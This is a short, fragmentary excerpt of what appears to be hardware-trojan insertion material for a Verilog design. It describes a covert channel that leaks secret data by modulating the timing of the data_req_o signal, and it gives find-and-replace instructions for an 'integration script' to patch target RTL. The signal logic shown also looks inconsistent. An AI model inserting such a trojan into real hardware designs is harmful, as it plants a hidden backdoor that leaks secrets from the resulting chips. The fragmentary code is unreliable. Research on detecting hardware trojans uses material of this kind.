 ...
 * Payload: Modulate timing of data_req_o based on secret data
 * 
...
assign secret_bit = data_req_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of data_req_o
//
// Integration Script Must Modify:
//
// IF data_req_o is timing-sensitive:
//   Find: assign data_req_o = ready_signal;
//   Replace: assign data_req_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
